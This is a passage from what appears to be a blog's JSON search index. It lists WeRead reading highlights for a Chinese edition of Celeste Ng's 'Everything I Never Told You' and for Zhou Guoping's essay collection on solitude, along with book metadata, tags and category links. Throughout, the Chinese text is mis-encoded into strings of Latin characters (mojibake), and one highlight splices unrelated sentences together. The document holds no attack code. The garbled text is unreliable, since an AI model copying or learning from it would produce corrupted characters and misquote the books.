æ— å£°å‘Šç™½","date":"2024-08-31T01:35:29.309Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/æ— å£°å‘Šç™½-ä¼ç»®è¯—/","text":"ä½œè€…ï¼šä¼ç»®è¯— - å†…å®¹ç®€ä»‹ ã€Šæ— å£°å‘Šç™½ã€‹ 2014ç¾å›½å¹´åº¦å›¾ä¹¦ç¬¬1åï¼Œæ¨ªæ‰«æ¬§ç¾å„ç§æ¦œå•ï¼Œå‡»è´¥æ–¯è’‚èŠ¬Â·é‡‘ã€æ‘ä¸Šæ˜¥æ ‘ã€å¤§å«Â·ç±³åˆ‡å°”ç­‰99ä½å¤§ç‰Œä½œå®¶ï¼â€œä»æ¥æ²¡æœ‰åœ¨ç¾å›½å°è¯´ä¸­è§è¿‡è¿™ç±»æ•…äº‹ï¼Œè‰è¿ªäºšæ­»äº†ï¼Œå¯ä»–ä»¬è¿˜ä¸çŸ¥é“ã€‚è‰è¿ªäºšæ˜¯å®¶ä¸­è€äºŒï¼Œæå…ˆç”Ÿå’Œæå¤ªå¤ªçš„æŒä¸Šæ˜ç ï¼Œå¥¹é—ä¼ äº†æ¯äº²çš„è“çœ¼ç›å’Œçˆ¶äº²çš„é»‘å¤´å‘ã€‚çˆ¶æ¯æ·±ä¿¡ï¼Œè‰è¿ªäºšä¸€å®šèƒ½å®ç°ä»–ä»¬æ— æ³•å®ç°çš„æ¢¦æƒ³ã€‚è‰è¿ªäºšçš„å°¸ä½“è¢«å‘ç°åï¼Œå¥¹çš„çˆ¶äº²å†…ç–šä¸å·²ï¼Œæ¯äº²åˆ™ä¸€å¿ƒæŠ¥å¤ã€‚è‰è¿ªäºšçš„å“¥å“¥è§‰å¾—ï¼Œéš”å£çš„åå°å­é“å®šè„±ä¸äº†å…³ç³»ï¼Œåªæœ‰è‰è¿ªäºšçš„å¦¹å¦¹çœ‹å¾—ä¸€æ¸…äºŒæ¥šï¼Œè€Œä¸”ï¼Œå¥¹å¾ˆå¯èƒ½æ˜¯å”¯ä¸€çŸ¥é“çœŸç›¸çš„äººâ€¦â€¦ æ— å£°å‘Šç™½ + ã€Šæ— å£°å‘Šç™½ã€‹ å±æ€§ å†…å®¹ ISBN 9787539982830 ä½œè€… ä¼ç»®è¯— å‡ºç‰ˆå¹´ 2015-07-01 å‡ºç‰ˆç¤¾ æ±Ÿè‹æ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº æ— å£°å‘Šç™½ åˆ†ç±» æ–‡å­¦-å¤–å›½æ–‡å­¦ é«˜äº®åˆ’çº¿ ç¬¬ä¸€ç«  ç¬¬ä¸€ç«  å¥¹å´è€¸è€¸è‚©ï¼Œä½å¤´ç›¯ç€ç›˜å­ï¼Œè¿çœ¼çš®éƒ½æ²¡æ€ä¹ˆæŠ¬ã€‚ä»–çŒœæƒ³ï¼Œè¿™è¯´æ˜æ²¡å‘ç”Ÿä»€ä¹ˆæ–°å¥‡çš„äº‹æƒ…ã€‚ç°åœ¨ï¼Œä»–è¿è‰è¿ªäºšæ˜¯å¦è·Ÿä»–æ‰“è¿‡æ‹›å‘¼éƒ½æƒ³ä¸èµ·æ¥äº†ã€‚ æ±‰å¨œçš„æˆ¿é—´åœ¨é˜æ¥¼ã€‚å¥¹é åœ¨åºŠæ²¿ä¸Šï¼Œä»åºŠå›´å­é‡Œæå‡ºä¸€æœ¬ä¹¦æ¥ã€‚å…¶å®è¿™æœ¬ä¹¦æ˜¯è‰è¿ªäºšçš„â€”â€”ã€Šå–§åš£ä¸éªšåŠ¨ã€‹ï¼Œé«˜é˜¶è‹±è¯­ï¼Œä¸é€‚åˆäº”å¹´çº§é˜…è¯»ã€‚å‡ å‘¨å‰ï¼Œå¥¹ä»è‰è¿ªäºšçš„æˆ¿é—´å·å‡ºè¿™æœ¬ä¹¦ï¼Œè‰è¿ªäºšæ ¹æœ¬æ²¡å‘ç°ã€‚è¿‡å»ä¸¤å‘¨ï¼Œå¥¹å¼€å§‹ä»å¤´åˆ°å°¾åœ°è¯»å®ƒï¼Œæ¯å¤©æ™šä¸Šéƒ½è¯»ä¸€ç‚¹ï¼Œå°±åƒå«ç€æ¨±æ¡ƒå‘³çš„â€œæ•‘ç”Ÿå‘˜â€ç‰Œç³–æœé‚£æ ·æ´¥æ´¥æœ‰å‘³åœ°å“å°é‡Œé¢çš„è¯è¯­ã€‚ä¸çŸ¥æ€çš„ï¼Œä»Šå¤©æ™šä¸Šè¿™æœ¬ä¹¦ä¼¼ä¹å˜å¾—ä¸ä¸€æ ·äº†ã€‚ç›´åˆ°å¥¹ç¿»åˆ°å‰ä¸€å¤©çœ‹åˆ°çš„åœ°æ–¹ï¼Œæ±‰å¨œæ‰æ˜ç™½åŸå› ï¼šè‰è¿ªäºšç”»å‡ºäº†ä¹¦ä¸­çš„ä¸€äº›å­—å¥ï¼Œæœ‰ä¸€ç›´èº²åœ¨å¥¹çš„æˆ¿é—´é‡Œï¼Œå½“å¤§å®¶åä¸‹æ¥åƒé¥­æ—¶ï¼Œå†…æ–¯é—®ï¼Œä»–ä¸åœ¨çš„è¿™å‡ å¤©ï¼Œå¥¹è¿‡å¾—æ€ä¹ˆæ ·ã€‚ â€” åˆ›å»ºäº [[2022-01-18]] 00:47 ^19-13844","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"å½“ä½ å­¦ä¼šç‹¬å¤„","date":"2024-08-31T01:35:29.306Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/å½“ä½ å­¦ä¼šç‹¬å¤„-å‘¨å›½å¹³/","text":"ä½œè€…ï¼šå‘¨å›½å¹³ - å†…å®¹ç®€ä»‹ ã€Šå½“ä½ å­¦ä¼šç‹¬å¤„ã€‹ â˜…ç»§ç•…é”€ä¹¦ã€Šäººç”Ÿå› å­¤ç‹¬è€Œä¸°ç››ã€‹ã€Šæ•¢äºå­¤ç‹¬çš„å‹‡æ°”ã€‹ååˆä¸€åŠ›ä½œï¼Œå‘¨å›½å¹³äº²è‡ªå®¡å®šï¼Œå‡èšåŠç”Ÿå“²æ€ä¸åˆ›ä½œç²¾åã€‚â˜…å‘¨å›½å¹³ä»¥â€œå­¦ä¼šç‹¬å¤„â€ä¸ºä¸»é¢˜çš„å…¨æ–°ç²¾é€‰æ–‡é›†ï¼Œ2020å¼€å¹´è¯šæ„ä¹‹ä½œï¼ŒçŒ®ç»™å¹´è½»äººçš„ç‹¬å¤„é”¦å›Šã€‚â˜…ç‹¬å¤„æ˜¯çµé­‚çš„å‡æœŸï¼Œä½ æ€»è¦æœ‰ä¸€æ®µä¸è‡ªæˆ‘ä¸ºä¼´çš„æ—¶å…‰ï¼Œåœ¨å››ä¸‹æ— äººæ—¶ç›´é¢è‡ªæˆ‘ï¼Œè®©å¿ƒçµå›å½’å®é™ï¼Œè®©ç”Ÿæ´»å›å½’ç®€å•ã€‚â˜…æ”¶å½•ã€Šæˆ‘æ›´æ„¿æ„åšæˆ‘è‡ªå·±ã€‹ã€Šç‹¬å¤„çš„å……å®ã€‹ã€Šå’Œå‘½è¿ç»“ä¼´è€Œè¡Œã€‹ç­‰ç»å…¸ä½œå“ï¼Œå­¦ä¼šæš‚åˆ«å–§åš£ï¼Œä¸åˆå¿ƒç›¸é€¢ã€‚â˜…æ”¶å½•ã€Šè¯»ç»å…¸å°±åƒå›å®¶ã€‹ã€Šæ¯”æˆåŠŸæ›´é‡è¦çš„ã€‹ç­‰å­¦ç”Ÿé˜…è¯»æ–‡ç« ï¼Œå“è¯»å“²æ€ä¸æ–‡é‡‡å¹¶å­˜çš„ä½³ä½œå…¸èŒƒï¼Œè¯»åå®¶åä½œï¼Œè®©ç†æ€§é˜…è¯»æˆä¸ºä¸€ç§ä¹ æƒ¯ã€‚â˜…æ”¶å½•å”¯ç¾æ„å¢ƒæ‘„å½±ä½œå“ï¼Œåœ¨å…‰å½±äº¤ç»‡ä¸­æ„Ÿå—æ„‰æ‚¦é€šé€çš„é˜…è¯»ä½“éªŒã€‚èƒ½åœ¨ç‹¬å¤„æ—¶å®‰ç„¶è‡ªå¾—ï¼Œå¿…èƒ½åœ¨çƒ­é—¹ä¸­æ·¡ç„¶è‡ªè‹¥ã€‚å¦‚æœç”Ÿå‘½é‡Œæœ‰è¿™æ ·ä¸€æ®µæ—¶å…‰ï¼Œåªèƒ½ç‹¬å¤„ä¸èƒ½å¤–å‡ºï¼Œä½ ä¼šåšäº›ä»€ä¹ˆï¼Ÿå½“ä½ ä¸€ä¸ªäººçš„æ—¶å€™ï¼Œæ˜¯æ„Ÿåˆ°ç™¾æ— èŠèµ–ï¼Œéš¾ä»¥å¿å—ï¼Œè¿˜æ˜¯æ„Ÿåˆ°ä¸€ç§å……å®å’Œæ»¡è¶³ï¼Ÿ äººä»¬å¾€å¾€æŠŠäº¤å¾€çœ‹ä½œä¸€ç§èƒ½åŠ›ï¼Œå´å¿½ç•¥äº†ç‹¬å¤„ä¹Ÿæ˜¯ä¸€ç§èƒ½åŠ›ã€‚ç‹¬å¤„ä¸æ˜¯ä¸ä¸–éš”ç»ï¼Œè€Œæ˜¯ä¸ºè‡ªå·±ä¿ç•™ä¸€ä¸ªå¼€é˜”çš„ç©ºé—´ï¼Œä¸€ç§å†…åœ¨çš„ä»å®¹ï¼Œåœ¨å¯æ”¯é…çš„æ—¶é—´é‡Œï¼Œä¸æ–­é è¿‘ç†æƒ³ä¸­çš„è‡ªæˆ‘ã€‚æœ¬ä¹¦åˆ†ä¸ºâ€œè‡ªæˆ‘â€â€œå‘½è¿â€â€œçµé­‚â€â€œè¯»ä¹¦â€â€œæ€§æ ¼â€â€œåæ€â€å…­ä¸ªä¸»é¢˜ï¼Œå„è‡ªè§’åº¦ï¼Œå¦‚ä¸€æ¡æ¡å¿ƒæµï¼Œæ±‡èšæˆä¸è‡ªæˆ‘å’Œè§£çš„ç”Ÿå‘½ä¹‹æ²³ï¼ŒæŠšæ…°äººå¿ƒï¼Œä¸°å¯Œçµé­‚ï¼Œæ„¿ä½ çš„ç”Ÿå‘½ä¸è¢«è¾œè´Ÿï¼Œæ¸…é†’æ—¶åšäº‹ï¼Œç‹¬å¤„æ—¶æ€è€ƒã€‚å­¦ä¼šç‹¬å¤„ï¼Œå°±æ˜¯å­¦ä¼šå¦‚ä½•è®©è‡ªå·±å®‰ä½äºå½“ä¸‹ã€‚ å½“ä½ å­¦ä¼šç‹¬å¤„ + ã€Šå½“ä½ å­¦ä¼šç‹¬å¤„ã€‹ å±æ€§ å†…å®¹ ISBN 9787213095399 ä½œè€… å‘¨å›½å¹³ å‡ºç‰ˆå¹´ 2020-03-01 å‡ºç‰ˆç¤¾ æµ™æ±Ÿäººæ°‘å‡ºç‰ˆç¤¾ æ¥æº å½“ä½ å­¦ä¼šç‹¬å¤„ åˆ†ç±» æ–‡å­¦-æ•£æ–‡æ‚è‘— é«˜äº®åˆ’çº¿ æˆ‘æ›´æ„¿æ„åšæˆ‘è‡ªå·± æˆ‘æ›´æ„¿æ„åšæˆ‘è‡ªå·± è‡ªçˆ±è€…æ‰èƒ½çˆ±äººï¼Œç»™äººä»¥ç”Ÿå‘½æ¬¢ä¹çš„äººï¼Œå¿…æ˜¯è‡ªå·±å……æ»¡ç€ç”Ÿå‘½æ¬¢ä¹çš„äººã€‚ â€” åˆ›å»ºäº [[2022-08-20]] 22:55 ^65-1021-1053 æˆ‘æ›´æ„¿æ„åšæˆ‘è‡ªå·± å½“ä½ é­å—å·¨å¤§ç—›è‹¦æ—¶ï¼Œä½ è¦æ‡‚å¾—è‡ªå·±å¿å—ï¼Œå°½é‡ä¸ç”¨ä½ çš„ç—›è‹¦å»æ…æ‰°åˆ«äººã€‚ â€” åˆ›å»ºäº [[2022-08-20]] 22:52 ^65-1897-1930 æˆ‘æ›´æ„¿æ„åšæˆ‘è‡ªå·± æˆ‘ä¹Ÿä¸€æ ·ï¼Œæƒ³å˜æˆä»»ä½•ä¸€ç§äººï¼Œä½“éªŒä»»ä½•ä¸€ç§ç”Ÿæ´»ï¼ŒåŒ…æ‹¬å›½ç‹ã€è´¢é˜€ã€åœ£å¾’ã€åƒ§ä¾£ã€å¼ºç›—ã€å¦“å¥³ç­‰ï¼Œç”šè‡³ä¹Ÿæ„¿æ„å˜æˆä¸€åªè‹è‡ï¼Œä½†å‰ææ˜¯èƒ½å¤Ÿå˜å›æˆ‘è‡ªå·±ã€‚æ‰€ä»¥ï¼Œå½’æ ¹åˆ°åº•ï¼Œæˆ‘æ›´æ„¿æ„æ˜¯æˆ‘è‡ªå·±ã€‚ â€” åˆ›å»ºäº [[2022-08-20]] 22:54 ^65-2424-2509 ç‹¬å¤„çš„å……å® ç‹¬å¤„çš„å……å® ä¸€åˆ‡ä¸¥æ ¼æ„ä¹‰ä¸Šçš„çµé­‚ç”Ÿæ´»éƒ½æ˜¯åœ¨ç‹¬å¤„æ—¶å±•å¼€çš„ã€‚ â€” åˆ›å»ºäº [[2022-04-11]] 23:22 ^66-612-634 ç‹¬å¤„çš„å……å® æˆ‘ç‹¬å¤„æ—¶ä»æ¥ä¸æ„Ÿåˆ°åŒçƒ¦ï¼Œé—²èŠæ‰æ˜¯æˆ‘ä¸€è¾ˆå­å¿å—ä¸äº†çš„äº‹æƒ…ã€‚ â€” åˆ›å»ºäº [[2022-04-11]] 23:21 ^66-766-794 ç‹¬å¤„çš„å……å® ä¸€åˆ‡äº¤å¾€çš„è´¨é‡éƒ½å–å†³äºäº¤å¾€è€…æœ¬èº«çš„è´¨é‡ã€‚å”¯æœ‰åœ¨ä¸¤ä¸ªçµé­‚å……å®ä¸°å¯Œçš„äººä¹‹é—´ï¼Œæ‰å¯èƒ½æœ‰çœŸæ­£åŠ¨äººçš„çˆ±æƒ…å’Œå‹è°Šã€‚ â€” åˆ›å»ºäº [[2022-04-11]] 23:21 ^66-1470-1521 å¿ƒçµçš„ç©ºé—´ å¿ƒçµçš„ç©ºé—´ æ— è®ºä½ å¤šä¹ˆçƒ­çˆ±è‡ªå·±çš„äº‹ä¸šï¼Œä¹Ÿæ— è®ºä½ çš„äº‹ä¸šæ˜¯ä»€ä¹ˆï¼Œä½ éƒ½è¦ä¸ºè‡ªå·±ä¿ç•™ä¸€ä¸ªå¼€é˜”çš„å¿ƒçµç©ºé—´ï¼Œä¸€ç§å†…åœ¨çš„ä»å®¹å’Œæ‚ é—²ã€‚å”¯æœ‰åœ¨è¿™ä¸ªå¿ƒçµç©ºé—´ä¸­ï¼Œä½ æ‰èƒ½æŠŠä½ çš„äº‹ä¸šä½œä¸ºä½ çš„ç”Ÿå‘½æœå®æ¥å“å°ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªç©ºé—´ï¼Œä½ æ°¸è¿œå¿™ç¢Œï¼Œä½ çš„å¿ƒçµæ°¸è¿œè¢«ä¸äº‹ä¸šç›¸å…³çš„å„ç§äº‹åŠ¡æ‰€å……å¡ï¼Œé‚£ä¹ˆï¼Œä¸ç®¡ä½ åœ¨äº‹ä¸šä¸Šå–å¾—äº†æ€æ ·çš„å¤–åœ¨æˆåŠŸï¼Œä½ éƒ½åªæ˜¯æŸè€—äº†ä½ çš„ç”Ÿå‘½è€Œæ²¡æœ‰å“å°åˆ°å®ƒçš„æœå®ã€‚ â€” åˆ›å»ºäº [[2022-02-28]] 00:00 ^67-1403-1566 ä¸°å¯Œçš„å®‰é™ ä¸°å¯Œçš„å®‰é™ ä¹Ÿè®¸ï¼Œæ¯ä¸€ä¸ªäººåœ¨ç”Ÿå‘½ä¸­çš„æŸä¸ªé˜¶æ®µæ˜¯éœ€è¦æŸç§çƒ­é—¹çš„ã€‚é‚£æ—¶å€™ï¼Œé¥±æ¶¨çš„ç”Ÿå‘½åŠ›éœ€è¦å‘å¤–å¥”çªï¼Œå»ä¸ºè‡ªå·±å¯»æ‰¾ä¸€æ¡æ²³é“ï¼Œç¡®å®šä¸€ä¸ªæµå‘ã€‚ä½†æ˜¯ï¼Œä¸€ä¸ªäººä¸èƒ½æ°¸è¿œåœç•™åœ¨è¿™ä¸ªé˜¶æ®µã€‚ â€” åˆ›å»ºäº [[2022-08-04]] 16:36 ^68-1028-1106 ä¸°å¯Œçš„å®‰é™ æ³°æˆˆå°”æ›¾è¯´ï¼šâ€œå¤–åœ¨ä¸–ç•Œçš„è¿åŠ¨æ— ç©·æ— å°½ï¼Œè¯æ˜äº†å…¶ä¸­æ²¡æœ‰æˆ‘ä»¬å¯ä»¥è¾¾åˆ°çš„ç›®æ ‡ï¼Œç›®æ ‡åªèƒ½åœ¨åˆ«å¤„ï¼Œå³åœ¨ç²¾ç¥çš„å†…åœ¨ä¸–ç•Œé‡Œã€‚åœ¨é‚£é‡Œï¼Œæˆ‘ä»¬æœ€ä¸ºæ·±åˆ‡åœ°æ¸´æœ›çš„ï¼Œä¹ƒæ˜¯åœ¨æˆå°±ä¹‹ä¸Šçš„å®‰å®ã€‚åœ¨é‚£é‡Œï¼Œæˆ‘ä»¬é‡è§æˆ‘ä»¬çš„ä¸Šå¸ã€‚â€ä»–æ¥ç€è¯´æ˜ï¼šâ€œä¸Šå¸å°±æ˜¯çµé­‚é‡Œæ°¸è¿œåœ¨ä¼‘æ¯çš„æƒ…çˆ±ã€‚â€ä»–æ‰€è¯´çš„æƒ…çˆ±åº”æ˜¯å¹¿ä¹‰çš„ï¼ŒæŒ‡åˆ›é€ çš„æˆå°±ï¼Œç²¾ç¥çš„å¯Œæœ‰ï¼Œåšå¤§çš„çˆ±å¿ƒï¼Œè€Œè¿™ä¸€åˆ‡éƒ½è¶…è¶Šäºä¿—ä¸–çš„äº‰æ–—ï¼Œå¤„åœ¨æ°¸ä¹…å’Œå¹³ä¹‹ä¸­ã€‚è¿™ç§å¢ƒç•Œï¼Œæ­£æ˜¯ä¸°å¯Œçš„å®‰é™ä¹‹æè‡´ã€‚ â€” åˆ›å»ºäº [[2023-02-03]] 01:08 ^68-1305-1495 ä¸°å¯Œçš„å®‰é™ æˆ‘å¹¶ä¸å®Œå…¨æ’æ–¥çƒ­é—¹ï¼Œçƒ­é—¹ä¹Ÿå¯ä»¥æ˜¯æœ‰å†…å®¹çš„ã€‚ä½†æ˜¯ï¼Œçƒ­é—¹æ€»å½’æ˜¯å¤–éƒ¨æ´»åŠ¨çš„ç‰¹å¾ï¼Œè€Œä»»ä½•å¤–éƒ¨æ´»åŠ¨å€˜è‹¥æ²¡æœ‰ä¸€ç§ç²¾ç¥è¿½æ±‚ä¸ºå…¶åŠ¨åŠ›ï¼Œæ²¡æœ‰ä¸€ç§ç²¾ç¥ä»·å€¼ä¸ºå…¶ç›®æ ‡ï¼Œé‚£ä¹ˆï¼Œä¸ç®¡è¡¨é¢ä¸Šå¤šä¹ˆè½°è½°çƒˆçƒˆï¼Œæœ‰å£°æœ‰è‰²ï¼Œæœ¬è´¨ä¸Šå¿…å®šæ˜¯è´«ä¹å’Œç©ºè™šçš„ã€‚æˆ‘å¯¹ä¸€åˆ‡å¤ªå–§åš£çš„äº‹ä¸šå’Œä¸€åˆ‡å¤ªå¼ æ‰¬çš„æ„Ÿæƒ…éƒ½å¿ƒå­˜æ€€ç–‘ï¼Œå®ƒä»¬æ€»æ˜¯ä½¿æˆ‘æƒ³èµ·èå£«æ¯”äºšå¯¹ç”Ÿå‘½çš„å˜²è®½ï¼šâ€œå……æ»¡äº†å£°éŸ³å’Œç‹‚çƒ­ï¼Œé‡Œé¢ç©ºæ— ä¸€ç‰©ã€‚â€ â€” åˆ›å»ºäº [[2022-08-04]] 16:37 ^68-1524-1691 äº¤å¾€çš„è´¨é‡ äº¤å¾€çš„è´¨é‡ é«˜è´¨é‡çš„å‹è°Šæ€»æ˜¯å‘ç”Ÿåœ¨ä¸¤ä¸ªä¼˜ç§€çš„ç‹¬ç«‹äººæ ¼ä¹‹é—´ï¼Œå®ƒçš„å®è´¨æ˜¯åŒæ–¹äº’ç›¸ç”±è¡·åœ°æ¬£èµå’Œå°Šæ•¬ã€‚å› æ­¤ï¼Œé‡è¦çš„æ˜¯ä½¿è‡ªå·±çœŸæ­£æœ‰ä»·å€¼ï¼Œé…å¾—ä¸Šåšä¸€ä¸ªé«˜è´¨é‡çš„æœ‹å‹ï¼Œè¿™æ˜¯ä¸€ä¸ªäººèƒ½å¤Ÿä¸ºå‹è°Šæ‰€åšçš„é¦–è¦è´¡çŒ®ã€‚ â€” åˆ›å»ºäº [[2022-03-04]] 17:08 ^70-455-543 äººç”Ÿçš„ä¸‰ä¸ªè§‰é†’ äººç”Ÿçš„ä¸‰ä¸ªè§‰é†’ äººç”Ÿæœ‰ä¸‰ä¸ªåŸºæœ¬çš„è§‰é†’ï¼šç”Ÿå‘½çš„è§‰é†’ã€è‡ªæˆ‘çš„è§‰é†’ã€çµé­‚çš„è§‰é†’ã€‚ â€” åˆ›å»ºäº [[2022-03-07]] 19:05 ^72-791-820 äººç”Ÿçš„ä¸‰ä¸ªè§‰é†’ ä¸€æ˜¯åœ¨äººç”Ÿçš„æ€åº¦ä¸Šè‡ªå·±åšä¸»ï¼Œæœ‰æ˜ç¡®åšå®šçš„ä»·å€¼è§‚ï¼Œæœ‰è‡ªå·±å¤„ä¸–åšäººçš„åŸåˆ™ï¼Œåœ¨ä¿—ä¸–ä¸­ä¸éšæ³¢é€æµã€‚äºŒæ˜¯åœ¨äº‹ä¸šçš„é€‰æ‹©ä¸Šè‡ªå·±åšä¸»ï¼Œæœ‰è‡ªå·±çœŸæ­£å–œæ¬¢åšçš„äº‹ï¼Œèƒ½å¤Ÿå…¨èº«å¿ƒåœ°æŠ•å…¥å…¶ä¸­ï¼Œæ„Ÿåˆ°å†…åœ¨çš„æ„‰å¿«å’Œå……å®ã€‚äººç”Ÿä¸­æœ‰çœŸä¿¡å¿µï¼Œäº‹ä¸šä¸Šæœ‰çœŸå…´è¶£ï¼Œè¿™äºŒè€…è¯æ˜äº†ä½ æœ‰ä¸€ä¸ªçœŸè‡ªæˆ‘ã€‚ â€” åˆ›å»ºäº [[2022-03-07]] 19:08 ^72-1911-2033 äººç”Ÿçš„ä¸‰ä¸ªè§‰é†’ çµé­‚çš„è§‰é†’æœ‰ä¸¤ä¸ªé€”å¾„ï¼Œä¸€æ˜¯ä¿¡ä»°ï¼ŒäºŒæ˜¯æ™ºæ…§ã€‚ â€” åˆ›å»ºäº [[2023-03-26]] 23:04 ^72-2400-2421 äººç”Ÿçš„ä¸‰ä¸ªè§‰é†’ æ±‰è¯­ä¸­â€œçµé­‚â€è¿™ä¸ªè¯å¾ˆæœ‰æ„æ€ï¼Œå¯ä»¥æ‹†åˆ†ä¸ºâ€œçµâ€å’Œâ€œé­‚â€ã€‚å’Œåˆ«çš„ç”Ÿå‘½ä¸åŒï¼Œäººæœ‰è‡ªæˆ‘æ„è¯†ï¼Œä¹Ÿå°±æ˜¯æœ‰ä¸€ä¸ªâ€œé­‚â€ã€‚åœ¨åŸºç£æ•™çœ‹æ¥ï¼Œè¿™ä¸ªâ€œé­‚â€åº”è¯¥æœ‰ä¸€ä¸ªç¥åœ£çš„æ¥æºï¼Œå°±æ˜¯ä¸Šå¸ã€‚ã€Šåœ£ç»ã€‹é‡Œè¯´ï¼Œä¸Šå¸æ˜¯æŒ‰ç…§è‡ªå·±çš„å½¢è±¡é€ äººçš„ã€‚å…¶å®ä¸Šå¸æ˜¯æ²¡æœ‰å½¢è±¡çš„ï¼Œå®Œå…¨æ˜¯â€œçµâ€ã€‚æ‰€ä»¥ï¼Œâ€œé­‚â€æ˜¯ä»â€œçµâ€æ¥çš„ã€‚å¯æ˜¯ï¼Œåœ¨è¿›å…¥è‚‰ä½“ä¹‹åï¼Œâ€œé­‚â€å¿˜è®°äº†è‡ªå·±çš„æ¥æºï¼Œå› æ­¤å¿…é¡»å’Œâ€œçµâ€é‡å»ºè”ç³»ï¼Œè¿™å°±æ˜¯ä¿¡ä»°ã€‚é€šè¿‡ä¿¡ä»°ï¼Œâ€œçµâ€æŠŠâ€œé­‚â€ç…§äº®ï¼Œäººæ‰çœŸæ­£æœ‰äº†â€œçµé­‚â€ã€‚ â€” åˆ›å»ºäº [[2023-03-26]] 23:04 ^72-2471-2673 äººç”Ÿå¯“è¨€ äººç”Ÿå¯“è¨€ ç”Ÿå‘½å®³æ€•å•è°ƒç”šäºå®³æ€•æ­»äº¡ â€” åˆ›å»ºäº [[2022-03-10]] 19:38 ^77-917-929 æ„ŸåŒèº«å—å‘€ çµé­‚çš„åœ¨åœº çµé­‚çš„åœ¨åœº å…³äºä»€ä¹ˆæ˜¯çµé­‚ï¼Œè´¹è¥¿è¯ºæœ‰ä¸€ä¸ªè¯´æ³•ï¼Œè®¤ä¸ºå®ƒæ˜¯è¿æ¥ç²¾ç¥å’Œè‚‰ä½“çš„ä¸­ä»‹ã€‚è£æ ¼ä¹Ÿæœ‰ä¸€ä¸ªè¯´æ³•ï¼Œè®¤ä¸ºç²¾ç¥è¯•å›¾è¶…è¶Šäººæ€§ï¼Œçµé­‚åˆ™è¯•å›¾è¿›å…¥äººæ€§ã€‚è¿™ä¸¤ç§è¯´æ³•éƒ½å¾ˆå¥½ï¼ŒåŠ ä»¥å¼•ç”³ï¼Œæˆ‘ä»¬ä¸å¦¨æŠŠçµé­‚å®šä¹‰ä¸ºæ™®éæ€§çš„ç²¾ç¥åœ¨ä¸ªä½“çš„äººèº«ä¸Šçš„å­˜åœ¨ï¼Œæˆ–è¶…è¶Šæ€§çš„ç²¾ç¥åœ¨äººçš„æ—¥å¸¸ç”Ÿæ´»ä¸­çš„å­˜åœ¨ã€‚ â€” åˆ›å»ºäº [[2022-03-13]] 20:02 ^79-721-843 çµé­‚çš„åœ¨åœº ä¸€ä¸ªäººçš„å·¥ä½œæ˜¯å¦å€¼å¾—å°Šæ•¬ï¼Œå–å†³äºä»–å®Œæˆå·¥ä½œçš„ç²¾ç¥è€Œéè¡Œä¸ºæœ¬èº« â€” åˆ›å»ºäº [[2022-03-27]] 21:16 ^79-1380-1410 çµé­‚çš„åœ¨åœº åº¦é—²çš„è´¨é‡äº¦åº”å–å†³äºçµé­‚æ‰€è·å¾—çš„æ„‰æ‚¦ï¼Œæ²¡æœ‰çµé­‚çš„å‚ä¸ï¼Œå†é«˜çš„æ¶ˆè´¹ä¹Ÿåªæ˜¯ä½è´¨é‡åœ°æ¶ˆåº¦äº†å®è´µçš„é—²æš‡æ—¶é—´ã€‚ â€” åˆ›å»ºäº [[2022-03-27]] 21:22 ^79-1534-1584 å°Šé‡ç”Ÿå‘½ å°Šé‡ç”Ÿå‘½ å¯æ˜¯ï¼Œæˆ‘å¦‚æ­¤å¶ç„¶åœ°æ¥åˆ°è¿™ä¸ªä¸–ç•Œï¼Œå´åˆå¿…ç„¶åœ°è¦ç¦»å¼€è¿™ä¸ªä¸–ç•Œï¼Œæˆ‘æ­»äº†ä»¥åï¼Œè¿™ä¸ªå®‡å®™é—´å†ä¹Ÿä¸å¯èƒ½ç¬¬äºŒæ¬¡æŠŠæˆ‘äº§ç”Ÿå‡ºæ¥äº†ã€‚è¿™ä¹ˆä¸€æƒ³ï¼Œä½ å¯èƒ½è§‰å¾—ç”Ÿå‘½æ˜¯ä¸€ç§éå¸¸è™šå¹»çš„ä¸œè¥¿ï¼Œä¹Ÿå¯èƒ½è§‰å¾—ç”Ÿå‘½æ˜¯ä¸€ç§éå¸¸çè´µçš„ä¸œè¥¿ã€‚ â€” åˆ›å»ºäº [[2022-04-08]] 23:13 ^86-792-889 è¯»ä¹¦çš„ç™–å¥½ è¯»ä¹¦çš„ç™–å¥½ è‹±å›½å“²å­¦å®¶ç½—ç´ ä¾¿æ˜¯ä¸€ä¸ªåœ¨è‡ªå·±çš„ä¸“ä¸šä¸Šåšå‡ºäº†ä¼Ÿå¤§æˆå°±çš„äººï¼Œç„¶è€Œï¼Œæ­£æ˜¯ä»–æœ€çƒ­çƒˆåœ°æå€¡é’å¹´äººå¤šè¯»â€œæ— ç”¨çš„ä¹¦â€ã€‚å…¶å®ï¼Œè¯»â€œæœ‰ç”¨çš„ä¹¦â€å³æ•™ç§‘ä¹¦å’Œä¸“ä¸šä¹¦å›ºç„¶æœ‰å…¶ç”¨é€”ï¼Œå¯ä»¥è·å¾—ç«‹è¶³äºç¤¾ä¼šçš„èŒä¸šæŠ€èƒ½ï¼Œä½†æ˜¯è¯»â€œæ— ç”¨çš„ä¹¦â€ä¹Ÿå¹¶éçœŸçš„æ— 